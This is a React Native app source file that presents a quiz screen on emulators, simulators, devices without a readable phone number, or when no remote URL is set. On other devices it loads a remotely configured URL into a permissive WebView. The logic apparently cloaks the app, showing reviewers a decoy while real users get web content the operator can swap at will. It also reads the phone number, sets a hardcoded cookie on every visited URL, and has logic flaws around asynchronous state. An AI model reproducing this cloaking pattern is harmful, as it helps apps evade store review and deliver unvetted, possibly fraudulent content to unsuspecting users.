import React, { useEffect, useState, useRef, useCallback } from 'react';
import { Quiz, Error, OfflineScreen } from './screens';
import remoteConfig from '@react-native-firebase/remote-config';
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';
import CookieManager from '@react-native-cookies/cookies';
import { BackHandler, ScrollView, ActivityIndicator } from 'react-native';
import { WebView } from 'react-native-webview';
import { styles } from './styles';

const App = () => {
  const webViewRef = useRef(null);
  const [isConnected, setIsConnected] = useState(false);
  const [error, setError] = useState(null);
  const [isSavedLink, setIsSavedLink] = useState(false);
  const [isNotValidPhone, setIsNotValidPhone] = useState(false);
  const [isLoadong, setLoading] = useState(false);
  const [link, setLink] = useState('');
  const [canGoBack, setCanGoBack] = useState(false);
  const [currentUrl, setCurrentUrl] = useState('');

  const handleBack = useCallback(() => {
    if (canGoBack && webViewRef.current) {
      webViewRef.current.goBack();
    }
    return true;
  }, [canGoBack]);

  readData = async () => {
    const value = await AsyncStorage.getItem('@url');

    if (value === null) {
      setIsSavedLink(false);
    } else {
      setIsSavedLink(true);
    }
  };

  async function remoteConfigOperations() {
    remoteConfig().fetch(1000);
    await remoteConfig()
      .setDefaults({
        url: link
      })
      .then(() => remoteConfig().fetchAndActivate());

    const url = remoteConfig().getValue('url');
    checkForPlug(url);
    if (isNotValidPhone) {
      console.log('is not valid phone', isNotValidPhone);
      return;
    }
    await saveData(url.asString());
  }

  navChange = (url) => {
    CookieManager.setFromResponse(
      url,
      'user_session=abcdefg; path=/; expires=Thu, 1 Jan 2030 00:00:00 -0000; secure; HttpOnly'
    );
  };

  const saveData = async (value) => {
    await AsyncStorage.setItem('@url', value);
    let resultLink = await AsyncStorage.getItem('@url');
    setLink(resultLink);
  };

  const checkForPlug = async (url) => {
    DeviceInfo.getPhoneNumber().then((phoneNumber) => {
      if (phoneNumber == 'unknown') {
        setIsNotValidPhone(true);
      }
    });
    DeviceInfo.isEmulator().then((isEmulator) => {
      if (isEmulator) {
        setIsNotValidPhone(true);
      }
    });
    if (DeviceInfo.getModel() == 'Simulator') {
      setIsNotValidPhone(true);
    }
    if (url.asString() == '') {
      setIsNotValidPhone(true);
    }
  };

  useEffect(() => {
    readData();
  }, []);

  useEffect(() => {
    BackHandler.addEventListener('hardwareBackPress', handleBack);
    return () => {
      BackHandler.removeEventListener('hardwareBackPress', handleBack);
    };
  }, [handleBack]);

  useEffect(() => {
    try {
      if (!isSavedLink) {
        remoteConfigOperations();
      }
    } catch (error) {
      setError(error);
    }
  }, [isSavedLink]);

  if (isSavedLink) {
    if (isConnected) {
      return (
        <>
          <WebView
            style={styles.container}
            originWhiteList={['*']}
            javaScriptEnabled={true}
            domStorageEnabled={true}
            thirdPartyCookiesEnabled={true}
            sharedCookiesEnabled={true}
            source={{ uri: link }}
            ref={webViewRef}
            onNavigationStateChange={(navState) => {
              setCurrentUrl(navState.url);
              navChange(navState.url);
            }}
            onLoadProgress={(event) => {
              if (currentUrl !== link) {
                setCanGoBack(event.nativeEvent.canGoBack);
              } else {
                setCanGoBack(false);
              }
            }}
            onLoadStart={() => setLoading(true)}
            onLoadEnd={() => setLoading(false)}
            setSupportMultipleWindows={false}
          />
          {isLoadong && <ActivityIndicator color="#234356" size="large" style={styles.loading} />}
        </>
      );
    } else {
      return <OfflineScreen setIsConnected={setIsConnected} />;
    }
  } else {
    if (isNotValidPhone) {
      return (
        <ScrollView style={styles.scrollView}>
          <Quiz />
        </ScrollView>
      );
    } else {
      if (error) {
        return <Error error={error} />;
      } else {
        return (
          <>
            <WebView
              style={styles.container}
              originWhiteList={['*']}
              javaScriptEnabled={true}
              domStorageEnabled={true}
              thirdPartyCookiesEnabled={true}
              sharedCookiesEnabled={true}
              source={{ uri: link }}
              ref={webViewRef}
              onNavigationStateChange={(navState) => {
                setCurrentUrl(navState.url);
                navChange(navState.url);
              }}
              onLoadProgress={(event) => {
                if (currentUrl !== link) {
                  setCanGoBack(event.nativeEvent.canGoBack);
                } else {
                  setCanGoBack(false);
                }
              }}
              onLoadStart={() => setLoading(true)}
              onLoadEnd={() => setLoading(false)}
              setSupportMultipleWindows={false}
            />
            {isLoadong && <ActivityIndicator color="#234356" size="large" style={styles.loading} />}
          </>
        );
      }
    }
  }
};

export default App;
